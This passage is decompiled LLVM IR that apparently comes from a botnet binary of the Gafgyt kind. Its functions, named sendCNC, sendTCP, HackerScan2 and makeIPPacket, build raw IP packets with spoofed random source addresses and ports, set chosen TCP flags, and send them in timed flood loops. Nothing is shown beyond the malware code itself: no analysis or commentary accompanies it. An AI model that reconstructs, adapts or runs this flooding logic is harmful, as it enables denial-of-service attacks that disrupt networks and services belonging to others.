  %v1_10009d30 = load i32, i32* @r1, align 4
  %v3_10009d30 = sub i32 %v1_10009d30, %v1_10009d20
  %v4_10009d30 = inttoptr i32 %v3_10009d30 to i32*
  store i32 %v2_10009d28, i32* %v4_10009d30, align 4
  %v1_10009d40 = add i32 %v3_10009d30, 23
  %v1_10009d44 = and i32 %v1_10009d40, -16
  %v1_10009d64 = add i32 %v1_10009d44, 20
  %v5_10009d68 = inttoptr i32 %v1_10009d64 to i16*
  %v0_10009d78 = call i32 @HackerScan2()
  store i32 %v0_10009d78, i32* @r3, align 4
  %v1_10009d84 = call i32 @htonl(i32 %v0_10009d78)
  %v1_10009d90 = add i32 %arg5, 8
  %v0_10009d98 = load i32, i32* @r29, align 4
  %v6_10009da8 = inttoptr i32 %v1_10009d44 to i32*
  %v7_10009da8 = call i32 @makeIPPacket(i32* %v6_10009da8, i32 %v0_10009d98, i32 %v1_10009d84, i32 17, i32 %v1_10009d90, i32 %arg5)
  %v1_10009db8 = urem i32 %v1_10009d90, 65536
  store i32 %v1_10009db8, i32* @r3, align 4
  %v1_10009dc0 = call i32 @htons(i32 %v1_10009db8)
  %sext = mul i32 %v1_10009dc0, 65536
  %v1_10009dc4 = sdiv i32 %sext, 65536
  %v1_10009dcc = trunc i32 %v1_10009dc4 to i16
  %v3_10009dcc = add i32 %v1_10009d44, 24
  %v4_10009dcc = inttoptr i32 %v3_10009dcc to i16*
  store i16 %v1_10009dcc, i16* %v4_10009dcc, align 8
  %v0_10009dd0 = call i32 @rand_cmwc()
  %v1_10009de0 = trunc i32 %v0_10009dd0 to i16
  store i16 %v1_10009de0, i16* %v5_10009d68, align 4
  br i1 %v3_10009a24, label %dec_label_pc_10009df0, label %dec_label_pc_10009e04

dec_label_pc_10009df0:                            ; preds = %dec_label_pc_10009d08
  %v0_10009df0 = call i32 @rand_cmwc()
  %extract.t76 = trunc i32 %v0_10009df0 to i16
  br label %dec_label_pc_10009e1c

dec_label_pc_10009e04:                            ; preds = %dec_label_pc_10009d08
  %v1_10009e08 = urem i32 %arg2, 65536
  store i32 %v1_10009e08, i32* @r3, align 4
  %v1_10009e10 = call i32 @htons(i32 %v1_10009e08)
  %extract.t = trunc i32 %v1_10009e10 to i16
  br label %dec_label_pc_10009e1c

dec_label_pc_10009e1c:                            ; preds = %dec_label_pc_10009df0, %dec_label_pc_10009e04
  %storemerge71.off0 = phi i16 [ %extract.t, %dec_label_pc_10009e04 ], [ %extract.t76, %dec_label_pc_10009df0 ]
  %v1_10009ef4.pre-phi = phi i32 [ %v1_10009e08, %dec_label_pc_10009e04 ], [ 0, %dec_label_pc_10009df0 ]
  %v3_10009e24 = add i32 %v1_10009d44, 22
  %v4_10009e24 = inttoptr i32 %v3_10009e24 to i16*
  store i16 %storemerge71.off0, i16* %v4_10009e24, align 2
  %v3_10009e30 = add i32 %v1_10009d44, 26
  %v4_10009e30 = inttoptr i32 %v3_10009e30 to i16*
  store i16 0, i16* %v4_10009e30, align 2
  %v1_10009e38 = add i32 %v1_10009d44, 28
  %v2_10009e44 = call i32 @makeRandomStr(i32 %v1_10009e38, i32 %arg5)
  %v1_10009e54 = or i32 %v1_10009d44, 2
  %v2_10009e54 = inttoptr i32 %v1_10009e54 to i16*
  %v3_10009e54 = load i16, i16* %v2_10009e54, align 2
  %v4_10009e54 = zext i16 %v3_10009e54 to i32
  %v5_10009e64 = inttoptr i32 %v1_10009d44 to i16*
  %v6_10009e64 = call i32 @csum(i16* %v5_10009e64, i32 %v4_10009e54, i32 %v1_10009d44, i32 17, i32 %v1_10009d90)
  %sext4 = mul i32 %v6_10009e64, 65536
  %v1_10009e68 = sdiv i32 %sext4, 65536
  %v1_10009e70 = trunc i32 %v1_10009e68 to i16
  %v3_10009e70 = or i32 %v1_10009d44, 10
  %v4_10009e70 = inttoptr i32 %v3_10009e70 to i16*
  store i16 %v1_10009e70, i16* %v4_10009e70, align 2
  store i32 268476028, i32* @lr, align 4
  %v1_10009e78 = call i32 @__GI_time(i32 0)
  %v2_10009e84 = add i32 %v1_10009e78, %arg3
  %v3_10009f24 = or i32 %v1_10009d44, 4
  %v4_10009f24 = inttoptr i32 %v3_10009f24 to i16*
  %v2_10009f48 = or i32 %v1_10009d44, 12
  %v3_10009f48 = inttoptr i32 %v2_10009f48 to i32*
  br label %dec_label_pc_10009e98

dec_label_pc_10009e98:                            ; preds = %dec_label_pc_10009e98.backedge, %dec_label_pc_10009e1c
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_10009e1c ], [ %storemerge24, %dec_label_pc_10009e98.backedge ]
  store i32 268476092, i32* @lr, align 4
  %v6_10009eb8 = call i32 @__libc_sendto(i32 %v3_10009bf4, i32 %v1_10009d44, i32 %v1_10009d0c, i32 0, i32 %v2_10009a58, i32 16)
  %v0_10009ebc = call i32 @rand_cmwc()
  %v1_10009ecc = trunc i32 %v0_10009ebc to i16
  store i16 %v1_10009ecc, i16* %v5_10009d68, align 4
  br i1 %v3_10009a24, label %dec_label_pc_10009edc, label %dec_label_pc_10009ef0

dec_label_pc_10009edc:                            ; preds = %dec_label_pc_10009e98
  %v0_10009edc = call i32 @rand_cmwc()
  %extract.t78 = trunc i32 %v0_10009edc to i16
  br label %dec_label_pc_10009f08

dec_label_pc_10009ef0:                            ; preds = %dec_label_pc_10009e98
  store i32 %v1_10009ef4.pre-phi, i32* @r3, align 4
  %v1_10009efc = call i32 @htons(i32 %v1_10009ef4.pre-phi)
  %extract.t77 = trunc i32 %v1_10009efc to i16
  br label %dec_label_pc_10009f08

dec_label_pc_10009f08:                            ; preds = %dec_label_pc_10009edc, %dec_label_pc_10009ef0
  %storemerge73.off0 = phi i16 [ %extract.t77, %dec_label_pc_10009ef0 ], [ %extract.t78, %dec_label_pc_10009edc ]
  store i16 %storemerge73.off0, i16* %v4_10009e24, align 2
  %v0_10009f14 = call i32 @rand_cmwc()
  %v1_10009f24 = trunc i32 %v0_10009f14 to i16
  store i16 %v1_10009f24, i16* %v4_10009f24, align 4
  %v0_10009f30 = call i32 @HackerScan2()
  store i32 %v0_10009f30, i32* @r3, align 4
  %v1_10009f3c = call i32 @htonl(i32 %v0_10009f30)
  store i32 %v1_10009f3c, i32* %v3_10009f48, align 4
  %v3_10009f58 = load i16, i16* %v2_10009e54, align 2
  %v4_10009f58 = zext i16 %v3_10009f58 to i32
  %v6_10009f68 = call i32 @csum(i16* %v5_10009e64, i32 %v4_10009f58, i32 %v1_10009d44, i32 0, i32 %v2_10009a58)
  %v1_10009f74 = trunc i32 %v6_10009f68 to i16
  store i16 %v1_10009f74, i16* %v4_10009e70, align 2
  %v4_10009f80 = icmp eq i32 %stack_var_-48.0, %arg6
  br i1 %v4_10009f80, label %dec_label_pc_10009f88, label %dec_label_pc_10009fac

dec_label_pc_10009f88:                            ; preds = %dec_label_pc_10009f08
  store i32 268476304, i32* @lr, align 4
  %v1_10009f8c = call i32 @__GI_time(i32 0)
  %v3_10009f98 = icmp sgt i32 %v1_10009f8c, %v2_10009e84
  br i1 %v3_10009f98, label %dec_label_pc_10009fbc, label %dec_label_pc_10009e98.backedge

dec_label_pc_10009e98.backedge:                   ; preds = %dec_label_pc_10009f88, %dec_label_pc_10009fac
  %storemerge24 = phi i32 [ %v1_10009fb0, %dec_label_pc_10009fac ], [ 0, %dec_label_pc_10009f88 ]
  br label %dec_label_pc_10009e98

dec_label_pc_10009fac:                            ; preds = %dec_label_pc_10009f08
  %v1_10009fb0 = add i32 %stack_var_-48.0, 1
  br label %dec_label_pc_10009e98.backedge

dec_label_pc_10009fbc:                            ; preds = %dec_label_pc_10009f88, %dec_label_pc_10009c5c, %dec_label_pc_10009c0c
  %v0_10009fe428 = phi i32 [ %v4_10009c74, %dec_label_pc_10009c5c ], [ %v4_10009c24, %dec_label_pc_10009c0c ], [ %v1_10009f8c, %dec_label_pc_10009f88 ]
  br label %dec_label_pc_10009fcc

dec_label_pc_10009fcc:                            ; preds = %dec_label_pc_10009bac, %dec_label_pc_10009a58, %dec_label_pc_10009ae8, %dec_label_pc_10009ac8, %dec_label_pc_10009fbc
  %v0_10009fe4 = phi i32 [ %v4_10009a68, %dec_label_pc_10009a58 ], [ 0, %dec_label_pc_10009ae8 ], [ %v4_10009ae0, %dec_label_pc_10009ac8 ], [ %v0_10009fe428, %dec_label_pc_10009fbc ], [ %v1_10009bb0, %dec_label_pc_10009bac ]
  ret i32 %v0_10009fe4

; uselistorder directives
  uselistorder i32 %v1_10009ef4.pre-phi, { 1, 0 }
  uselistorder i32 %v1_10009e08, { 2, 1, 0 }
  uselistorder i32 %v1_10009db8, { 1, 0 }
  uselistorder i32 %v1_10009d90, { 2, 0, 1 }
  uselistorder i32 %v1_10009d44, { 9, 10, 1, 2, 3, 11, 0, 4, 5, 6, 7, 8, 12, 13 }
  uselistorder i32 %v2_10009a58, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10009a44, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0 }
  uselistorder i32 %arg5, { 1, 3, 2, 5, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_10009fcc, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10009e98.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10009f08, { 1, 0 }
  uselistorder label %dec_label_pc_10009e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10009d08, { 1, 0 }
  uselistorder label %dec_label_pc_10009c88, { 1, 0 }
  uselistorder label %dec_label_pc_10009bac, { 1, 0 }
  uselistorder label %dec_label_pc_10009a58, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  store i32 268476432, i32* @lr, align 4
  %v1_1000a00c = call i32 @__GI_time(i32 0)
  %v2_1000a018 = add i32 %v1_1000a00c, %arg3
  store i32 268476460, i32* @lr, align 4
  %v1_1000a028 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-48, align 4
  %v1_1000a040 = urem i32 %arg2, 65536
  store i32 %v1_1000a040, i32* @r3, align 4
  %v1_1000a048 = call i32 @htons(i32 %v1_1000a040)
  store i32 268476572, i32* @lr, align 4
  %v1_1000a0981 = call i32 @__GI_time(i32 0)
  %v2_1000a0a42 = icmp slt i32 %v1_1000a0981, %v2_1000a018
  br i1 %v2_1000a0a42, label %dec_label_pc_1000a058.lr.ph, label %dec_label_pc_1000a0ac

dec_label_pc_1000a058.lr.ph:                      ; preds = %entry
  %v2_1000a070 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_1000a058

dec_label_pc_1000a058:                            ; preds = %dec_label_pc_1000a058.lr.ph, %dec_label_pc_1000a058
  store i32 268476520, i32* @lr, align 4
  %v3_1000a064 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a084.465 to i32), i32* @lr, align 4
  %v3_1000a080 = call i32 @__libc_connect(i32 %v3_1000a064, i32 %v2_1000a070, i32 16)
  store i32 268476556, i32* @lr, align 4
  %v1_1000a088 = call i32 @sleep(i32 1)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a094.466 to i32), i32* @lr, align 4
  %v1_1000a090 = call i32 @__libc_close(i32 %v3_1000a064)
  store i32 268476572, i32* @lr, align 4
  %v1_1000a098 = call i32 @__GI_time(i32 0)
  %v2_1000a0a4 = icmp slt i32 %v1_1000a098, %v2_1000a018
  br i1 %v2_1000a0a4, label %dec_label_pc_1000a058, label %dec_label_pc_1000a0ac

dec_label_pc_1000a0ac:                            ; preds = %dec_label_pc_1000a058, %entry
  %v1_1000a098.lcssa = phi i32 [ %v1_1000a0981, %entry ], [ %v1_1000a098, %dec_label_pc_1000a058 ]
  ret i32 %v1_1000a098.lcssa

; uselistorder directives
  uselistorder i32 %v1_1000a040, { 1, 0 }
  uselistorder i32 %v2_1000a018, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 268476572, { 1, 0 }
  uselistorder label %dec_label_pc_1000a058, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000a0c4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000a0c4, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_1000a114 = icmp eq i32 %arg2, 0
  br i1 %v3_1000a114, label %dec_label_pc_1000a11c, label %dec_label_pc_1000a130

dec_label_pc_1000a11c:                            ; preds = %entry
  %v0_1000a11c = call i32 @rand_cmwc()
  br label %dec_label_pc_1000a148

dec_label_pc_1000a130:                            ; preds = %entry
  %v1_1000a134 = urem i32 %arg2, 65536
  store i32 %v1_1000a134, i32* @r3, align 4
  %v1_1000a13c = call i32 @htons(i32 %v1_1000a134)
  br label %dec_label_pc_1000a148

dec_label_pc_1000a148:                            ; preds = %dec_label_pc_1000a11c, %dec_label_pc_1000a130
  %v2_1000a148 = ptrtoint i32* %stack_var_-92 to i32
  %v4_1000a158 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_1000a148)
  %v3_1000a160 = icmp eq i32 %v4_1000a158, 0
  br i1 %v3_1000a160, label %dec_label_pc_1000a16c, label %dec_label_pc_1000a6f8

dec_label_pc_1000a16c:                            ; preds = %dec_label_pc_1000a148
  store i32 268476820, i32* @lr, align 4
  %v3_1000a190 = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_1000a1a0 = icmp eq i32 %v3_1000a190, 0
  br i1 %v3_1000a1a0, label %dec_label_pc_1000a1a8, label %dec_label_pc_1000a1c8

dec_label_pc_1000a1a8:                            ; preds = %dec_label_pc_1000a16c
  %v3_1000a1ac = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint (i32* @global_var_1000a1c4.467 to i32), i32* @lr, align 4
  %v4_1000a1c0 = call i32 @HackerPrint(i32 %v3_1000a1ac, i32 ptrtoint ([27 x i8]* @global_var_10018d28.458 to i32), i32 268566528)
  br label %dec_label_pc_1000a6f8

dec_label_pc_1000a1c8:                            ; preds = %dec_label_pc_1000a16c
  store i32 1, i32* %stack_var_-76, align 4
  %v2_1000a1d0 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268476908, i32* @lr, align 4
  %v5_1000a1e8 = call i32 @__GI_setsockopt(i32 %v3_1000a190, i32 0, i32 3, i32 %v2_1000a1d0, i32 4)
  %tmp59 = icmp sgt i32 %v5_1000a1e8, -1
  br i1 %tmp59, label %dec_label_pc_1000a218, label %dec_label_pc_1000a1f8

dec_label_pc_1000a1f8:                            ; preds = %dec_label_pc_1000a1c8
  %v3_1000a1fc = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint (i32* @global_var_1000a214.468 to i32), i32* @lr, align 4
  %v4_1000a210 = call i32 @HackerPrint(i32 %v3_1000a1fc, i32 ptrtoint ([33 x i8]* @global_var_10018d44.462 to i32), i32 268566528)
  br label %dec_label_pc_1000a6f8

dec_label_pc_1000a218:                            ; preds = %dec_label_pc_1000a1c8
  %v3_1000a21c = icmp eq i32 %arg4, 0
  br i1 %v3_1000a21c, label %dec_label_pc_1000a248, label %dec_label_pc_1000a230

dec_label_pc_1000a230:                            ; preds = %dec_label_pc_1000a218
  br label %dec_label_pc_1000a248

dec_label_pc_1000a248:                            ; preds = %dec_label_pc_1000a218, %dec_label_pc_1000a230
  %v1_1000a24c = add i32 %arg6, 40
  %v1_1000a25c = add i32 %arg6, 70
  %v1_1000a260 = and i32 %v1_1000a25c, -16
  %v2_1000a268 = load i32, i32* %stack_var_-128, align 4
  %v1_1000a270 = load i32, i32* @r1, align 4
  %v3_1000a270 = sub i32 %v1_1000a270, %v1_1000a260
  %v4_1000a270 = inttoptr i32 %v3_1000a270 to i32*
  store i32 %v2_1000a268, i32* %v4_1000a270, align 4
  %v1_1000a280 = add i32 %v3_1000a270, 23
  %v1_1000a284 = and i32 %v1_1000a280, -16
  %v1_1000a2a4 = add i32 %v1_1000a284, 20
  %v5_1000a2a8 = inttoptr i32 %v1_1000a2a4 to i16*
  %v0_1000a2b8 = call i32 @HackerScan2()
  store i32 %v0_1000a2b8, i32* @r3, align 4
  %v1_1000a2c4 = call i32 @htonl(i32 %v0_1000a2b8)
  %v1_1000a2d0 = add i32 %arg6, 20
  %v0_1000a2d8 = load i32, i32* @r29, align 4
  %v6_1000a2e8 = inttoptr i32 %v1_1000a284 to i32*
  %v7_1000a2e8 = call i32 @makeIPPacket(i32* %v6_1000a2e8, i32 %v0_1000a2d8, i32 %v1_1000a2c4, i32 6, i32 %v1_1000a2d0, i32 %arg6)
  %v0_1000a2ec = call i32 @rand_cmwc()
  %v1_1000a2fc = trunc i32 %v0_1000a2ec to i16
  store i16 %v1_1000a2fc, i16* %v5_1000a2a8, align 4
  %v0_1000a300 = call i32 @rand_cmwc()
  %v2_1000a30c = add i32 %v1_1000a284, 24
  %v3_1000a30c = inttoptr i32 %v2_1000a30c to i32*
  store i32 %v0_1000a300, i32* %v3_1000a30c, align 8
  %v2_1000a318 = add i32 %v1_1000a284, 28
  %v3_1000a318 = inttoptr i32 %v2_1000a318 to i32*
  store i32 0, i32* %v3_1000a318, align 4
  %v1_1000a320 = add i32 %v1_1000a284, 32
  %v2_1000a320 = inttoptr i32 %v1_1000a320 to i32*
  %v1_1000a328 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_1000a32c = add i32 %v1_1000a284, 32
  %v3_1000a32c = inttoptr i32 %v2_1000a32c to i32*
  store i32 %v1_1000a328, i32* %v3_1000a32c, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_10018d68.469 to i32), i32* @r4, align 4
  %v3_1000a340 = inttoptr i32 %arg5 to i8*
  %v4_1000a340 = call i32 @__GI_strcoll(i8* %v3_1000a340, i32 ptrtoint ([4 x i8]* @global_var_10018d68.469 to i32))
  %v3_1000a348 = icmp eq i32 %v4_1000a340, 0
  br i1 %v3_1000a348, label %dec_label_pc_1000a350, label %dec_label_pc_1000a3a4

dec_label_pc_1000a350:                            ; preds = %dec_label_pc_1000a248
  %v3_1000a354 = load i32, i32* %v2_1000a320, align 16
  %v1_1000a398 = or i32 %v3_1000a354, 2031616
  store i32 %v1_1000a398, i32* %v2_1000a320, align 16
  br label %dec_label_pc_1000a50c

dec_label_pc_1000a3a4:                            ; preds = %dec_label_pc_1000a248
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268477368, i32* @lr, align 4
  %v3_1000a3b4 = call i32 @__GI_strtok(i32 %arg5, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000a50418 = icmp eq i32 %v3_1000a3b4, 0
  br i1 %v3_1000a50418, label %dec_label_pc_1000a50c, label %dec_label_pc_1000a3c4

dec_label_pc_1000a3c4:                            ; preds = %dec_label_pc_1000a3a4, %dec_label_pc_1000a4e8
  %storemerge1319 = phi i32 [ %v3_1000a4f4, %dec_label_pc_1000a4e8 ], [ %v3_1000a3b4, %dec_label_pc_1000a3a4 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10018d70.471 to i32), i32* @r4, align 4
  %v3_1000a3d4 = inttoptr i32 %storemerge1319 to i8*
  %v4_1000a3d4 = call i32 @__GI_strcoll(i8* %v3_1000a3d4, i32 ptrtoint ([4 x i8]* @global_var_10018d70.471 to i32))
  %v3_1000a3dc = icmp eq i32 %v4_1000a3d4, 0
  br i1 %v3_1000a3dc, label %dec_label_pc_1000a3e4, label %dec_label_pc_1000a3f8

dec_label_pc_1000a3e4:                            ; preds = %dec_label_pc_1000a3c4
  %v3_1000a3e8 = load i32, i32* %v2_1000a320, align 16
  %v1_1000a3ec = or i32 %v3_1000a3e8, 131072
  store i32 %v1_1000a3ec, i32* %v2_1000a320, align 16
  br label %dec_label_pc_1000a4e8

dec_label_pc_1000a3f8:                            ; preds = %dec_label_pc_1000a3c4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d74.472 to i32), i32* @r4, align 4
  %v4_1000a408 = call i32 @__GI_strcoll(i8* %v3_1000a3d4, i32 ptrtoint ([4 x i8]* @global_var_10018d74.472 to i32))
  %v3_1000a410 = icmp eq i32 %v4_1000a408, 0
  br i1 %v3_1000a410, label %dec_label_pc_1000a418, label %dec_label_pc_1000a42c

dec_label_pc_1000a418:                            ; preds = %dec_label_pc_1000a3f8
  %v3_1000a41c = load i32, i32* %v2_1000a320, align 16
  %v1_1000a420 = or i32 %v3_1000a41c, 262144
  store i32 %v1_1000a420, i32* %v2_1000a320, align 16
  br label %dec_label_pc_1000a4e8

dec_label_pc_1000a42c:                            ; preds = %dec_label_pc_1000a3f8
  store i32 ptrtoint ([4 x i8]* @global_var_10018d78.473 to i32), i32* @r4, align 4
  %v4_1000a43c = call i32 @__GI_strcoll(i8* %v3_1000a3d4, i32 ptrtoint ([4 x i8]* @global_var_10018d78.473 to i32))
  %v3_1000a444 = icmp eq i32 %v4_1000a43c, 0
  br i1 %v3_1000a444, label %dec_label_pc_1000a44c, label %dec_label_pc_1000a460

dec_label_pc_1000a44c:                            ; preds = %dec_label_pc_1000a42c
  %v3_1000a450 = load i32, i32* %v2_1000a320, align 16
  %v1_1000a454 = or i32 %v3_1000a450, 65536
  store i32 %v1_1000a454, i32* %v2_1000a320, align 16
  br label %dec_label_pc_1000a4e8

dec_label_pc_1000a460:                            ; preds = %dec_label_pc_1000a42c
  store i32 ptrtoint ([4 x i8]* @global_var_10018d7c.474 to i32), i32* @r4, align 4
  %v4_1000a470 = call i32 @__GI_strcoll(i8* %v3_1000a3d4, i32 ptrtoint ([4 x i8]* @global_var_10018d7c.474 to i32))
  %v3_1000a478 = icmp eq i32 %v4_1000a470, 0
  br i1 %v3_1000a478, label %dec_label_pc_1000a480, label %dec_label_pc_1000a494

dec_label_pc_1000a480:                            ; preds = %dec_label_pc_1000a460
  %v3_1000a484 = load i32, i32* %v2_1000a320, align 16
  %v1_1000a488 = or i32 %v3_1000a484, 1048576
  store i32 %v1_1000a488, i32* %v2_1000a320, align 16
  br label %dec_label_pc_1000a4e8

dec_label_pc_1000a494:                            ; preds = %dec_label_pc_1000a460
  store i32 ptrtoint ([4 x i8]* @global_var_10018d80.475 to i32), i32* @r4, align 4
  %v4_1000a4a4 = call i32 @__GI_strcoll(i8* %v3_1000a3d4, i32 ptrtoint ([4 x i8]* @global_var_10018d80.475 to i32))
  %v3_1000a4ac = icmp eq i32 %v4_1000a4a4, 0
  br i1 %v3_1000a4ac, label %dec_label_pc_1000a4b4, label %dec_label_pc_1000a4c8

dec_label_pc_1000a4b4:                            ; preds = %dec_label_pc_1000a494
  %v3_1000a4b8 = load i32, i32* %v2_1000a320, align 16
  %v1_1000a4bc = or i32 %v3_1000a4b8, 524288
  store i32 %v1_1000a4bc, i32* %v2_1000a320, align 16
  br label %dec_label_pc_1000a4e8

dec_label_pc_1000a4c8:                            ; preds = %dec_label_pc_1000a494
  %v3_1000a4cc = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a4e8.477 to i32), i32* @lr, align 4
  %v5_1000a4e4 = call i32 @HackerPrint(i32 %v3_1000a4cc, i32 ptrtoint ([18 x i8]* @global_var_10018d84.476 to i32), i32 %storemerge1319)
  br label %dec_label_pc_1000a4e8

dec_label_pc_1000a4e8:                            ; preds = %dec_label_pc_1000a4b4, %dec_label_pc_1000a480, %dec_label_pc_1000a44c, %dec_label_pc_1000a418, %dec_label_pc_1000a3e4, %dec_label_pc_1000a4c8
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268477688, i32* @lr, align 4
  %v3_1000a4f4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000a504 = icmp eq i32 %v3_1000a4f4, 0
  br i1 %v3_1000a504, label %dec_label_pc_1000a50c, label %dec_label_pc_1000a3c4

dec_label_pc_1000a50c:                            ; preds = %dec_label_pc_1000a4e8, %dec_label_pc_1000a3a4, %dec_label_pc_1000a350
  %v0_1000a50c = call i32 @rand_cmwc()
  %v1_1000a51c = trunc i32 %v0_1000a50c to i16
  %v3_1000a51c = add i32 %v1_1000a284, 34
  %v4_1000a51c = inttoptr i32 %v3_1000a51c to i16*
  store i16 %v1_1000a51c, i16* %v4_1000a51c, align 2
  %v3_1000a528 = add i32 %v1_1000a284, 36
  %v4_1000a528 = inttoptr i32 %v3_1000a528 to i16*
  store i16 0, i16* %v4_1000a528, align 4
  %v3_1000a534 = add i32 %v1_1000a284, 38
  %v4_1000a534 = inttoptr i32 %v3_1000a534 to i16*
  store i16 0, i16* %v4_1000a534, align 2
  br i1 %v3_1000a114, label %dec_label_pc_1000a544, label %dec_label_pc_1000a558

dec_label_pc_1000a544:                            ; preds = %dec_label_pc_1000a50c
  %v0_1000a544 = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_1000a544 to i16
  br label %dec_label_pc_1000a570

dec_label_pc_1000a558:                            ; preds = %dec_label_pc_1000a50c
  %v1_1000a55c = urem i32 %arg2, 65536
  store i32 %v1_1000a55c, i32* @r3, align 4
  %v1_1000a564 = call i32 @htons(i32 %v1_1000a55c)
  %extract.t = trunc i32 %v1_1000a564 to i16
  br label %dec_label_pc_1000a570

dec_label_pc_1000a570:                            ; preds = %dec_label_pc_1000a544, %dec_label_pc_1000a558
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_1000a558 ], [ %extract.t63, %dec_label_pc_1000a544 ]
  %v3_1000a578 = add i32 %v1_1000a284, 22
  %v4_1000a578 = inttoptr i32 %v3_1000a578 to i16*
  store i16 %storemerge60.off0, i16* %v4_1000a578, align 2
  store i32 268477832, i32* @lr, align 4
  %v3_1000a584 = inttoptr i32 %v1_1000a2a4 to i32*
  %v4_1000a584 = call i32 @tcpcsum(i32 %v1_1000a284, i32* %v3_1000a584, i32 %v1_1000a2a4)
  %v1_1000a590 = trunc i32 %v4_1000a584 to i16
  store i16 %v1_1000a590, i16* %v4_1000a528, align 4
  %v1_1000a5a0 = or i32 %v1_1000a284, 2
  %v2_1000a5a0 = inttoptr i32 %v1_1000a5a0 to i16*
  %v3_1000a5a0 = load i16, i16* %v2_1000a5a0, align 2
  %v4_1000a5a0 = zext i16 %v3_1000a5a0 to i32
  %v5_1000a5b0 = inttoptr i32 %v1_1000a284 to i16*
  %v6_1000a5b0 = call i32 @csum(i16* %v5_1000a5b0, i32 %v4_1000a5a0, i32 %v1_1000a284, i32 6, i32 %v1_1000a2d0)
  %sext3 = mul i32 %v6_1000a5b0, 65536
  %v1_1000a5b4 = sdiv i32 %sext3, 65536
  %v1_1000a5bc = trunc i32 %v1_1000a5b4 to i16
  %v3_1000a5bc = or i32 %v1_1000a284, 10
  %v4_1000a5bc = inttoptr i32 %v3_1000a5bc to i16*
  store i16 %v1_1000a5bc, i16* %v4_1000a5bc, align 2
  store i32 268477896, i32* @lr, align 4
  %v1_1000a5c4 = call i32 @__GI_time(i32 0)
  %v2_1000a5d0 = add i32 %v1_1000a5c4, %arg3
  %v2_1000a628 = or i32 %v1_1000a284, 12
  %v3_1000a628 = inttoptr i32 %v2_1000a628 to i32*
  %v3_1000a63c = or i32 %v1_1000a284, 4
  %v4_1000a63c = inttoptr i32 %v3_1000a63c to i16*
  br label %dec_label_pc_1000a5e4

dec_label_pc_1000a5e4:                            ; preds = %dec_label_pc_1000a5e4.backedge, %dec_label_pc_1000a570
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_1000a570 ], [ %storemerge22, %dec_label_pc_1000a5e4.backedge ]
  store i32 268477960, i32* @lr, align 4
  %v6_1000a604 = call i32 @__libc_sendto(i32 %v3_1000a190, i32 %v1_1000a284, i32 %v1_1000a24c, i32 0, i32 %v2_1000a148, i32 16)
  %v0_1000a610 = call i32 @HackerScan2()
  store i32 %v0_1000a610, i32* @r3, align 4
  %v1_1000a61c = call i32 @htonl(i32 %v0_1000a610)
  store i32 %v1_1000a61c, i32* %v3_1000a628, align 4
  %v0_1000a62c = call i32 @rand_cmwc()
  %v1_1000a63c = trunc i32 %v0_1000a62c to i16
  store i16 %v1_1000a63c, i16* %v4_1000a63c, align 4
  %v0_1000a640 = call i32 @rand_cmwc()
  store i32 %v0_1000a640, i32* %v3_1000a30c, align 8
  %v0_1000a650 = call i32 @rand_cmwc()
  %v1_1000a660 = trunc i32 %v0_1000a650 to i16
  store i16 %v1_1000a660, i16* %v5_1000a2a8, align 4
  store i16 0, i16* %v4_1000a528, align 4
  store i32 268478076, i32* @lr, align 4
  %v4_1000a678 = call i32 @tcpcsum(i32 %v1_1000a284, i32* %v3_1000a584, i32 %v1_1000a2a4)
  %v1_1000a684 = trunc i32 %v4_1000a678 to i16
  store i16 %v1_1000a684, i16* %v4_1000a528, align 4
  %v3_1000a694 = load i16, i16* %v2_1000a5a0, align 2
  %v4_1000a694 = zext i16 %v3_1000a694 to i32
  %v6_1000a6a4 = call i32 @csum(i16* %v5_1000a5b0, i32 %v4_1000a694, i32 %v1_1000a284, i32 0, i32 %v2_1000a148)
  %v1_1000a6b0 = trunc i32 %v6_1000a6a4 to i16
  store i16 %v1_1000a6b0, i16* %v4_1000a5bc, align 2
  %v4_1000a6bc = icmp eq i32 %stack_var_-44.0, %arg7
